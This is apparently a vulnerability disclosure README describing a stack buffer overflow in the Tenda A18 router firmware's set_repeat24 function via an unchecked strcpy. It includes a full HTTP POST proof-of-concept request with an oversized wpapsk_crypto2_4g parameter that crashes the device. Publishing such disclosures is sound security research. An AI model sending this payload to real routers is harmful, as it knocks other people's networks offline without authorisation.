# Tenda A18(V15.13.07.09) contains Stack Buffer Overflow Vulnerability

## overview

- Manufacturer's website information：https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-2760.html

## product information

Tenda A18(V15.13.07.09), latest version of simulation overview：

![image-20220827203759347](readme.assets/image-20220827203759347.png)

## description

### 1. Vulnerability Details

The Tenda A18(V15.13.07.09) contains a stack overflow vulnerability in `formSetWirelessRepeat` function, 

![image-20220827232707877](readme.assets/image-20220827232707877.png)

the var `wpapsk_cryptob` is passed to function `set_repeat24`. 

![image-20220827232821786](readme.assets/image-20220827232821786.png)

In function`set_repeat24`, `strcpy(wpapsk_cryptovalue, wpask_crtpto)`  copies `wpapsk_crypto` to `wpapsk_cryptovalue` which is on the stack without checking length. so there is a stack overflow vulnerability. 

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/WifiExtraSet?0.8091932091744871 HTTP/1.1
Host: 127.0.0.1
Content-Length: 640
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: password=6b8b45679hd
Connection: close

configured2_4g=true&configured5g=true&wpapsk_crypto2_4g=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&security2_4g=wpapsk&originSsid2_4g=1&extSSID2_4g=1&wpapsk_key2_4g=aaaaaaaaaaacle
```

By sending this poc, we can achieve the effect of a denial-of-service(DOS) attack .

![image-20220827233151713](readme.assets/image-20220827233151713.png)